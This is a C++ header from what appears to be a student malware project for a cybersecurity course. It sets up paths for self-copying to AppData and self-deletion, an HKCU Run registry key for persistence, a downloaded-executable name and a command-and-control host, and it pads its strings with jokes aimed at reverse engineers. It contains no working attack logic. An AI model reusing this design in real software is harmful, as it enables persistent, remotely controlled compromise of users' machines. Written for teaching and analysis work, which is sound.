
#pragma once
#include <string>
#include <windows.h>
using namespace std;
/*
	Utility Module:
	Responsible for maintaining and building the various directory paths for self deletion and copy 
*/

class UTIL {
	string path;
	string username;
	string base = "C:\\Users\\";
	string appData = "\\AppData\\Roaming";
	string clone = "\\clone.exe";
	string cloneKeyName = "clone";
	string downloadFileName = "downloaded.exe";
	string downloaded = "\\" + downloadFileName;
	LPCSTR c2host = "www.uvu-cybersecurity.com";
	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char filename[MAX_PATH];
	void getModuleName();
	string currentDirectory;

	// Must have 10 strings at least
	string one = "I don't always code, but when I do it's bad";
	string two = "You'll never catch me";
	string three = "Good luck reversing this code loooool";
	string four = "I'll take, what is security, for 600 Alex";
	string five = "l337";
	string six = "SecretApi()";
	string seven = "Graduating 2019 ftw!";
	string eight = "What do you call a fake noodle? An impasta!";
	string nine = "What do you call cheese that isn't yours? Nacho cheese.";
	string ten = "1 cup mozarella 1, cup cheddar jack, apply jalapeno jelly to liking, butter both sides of bread, and grill to perfection.";
public:
	char* getFileName();
	string getPath();
	string getBase();
	string getAppData();
	string getClone();
	string getCloneKeyName();
	string getDownloaded();
	string getDownloadFileName();
	string getUsername();
	string getAppDataPath();
	string getCurrentDirectory();
	LPCSTR getC2Host();
	LPCSTR getRunKey();
	bool isExecutingFromAppData();
};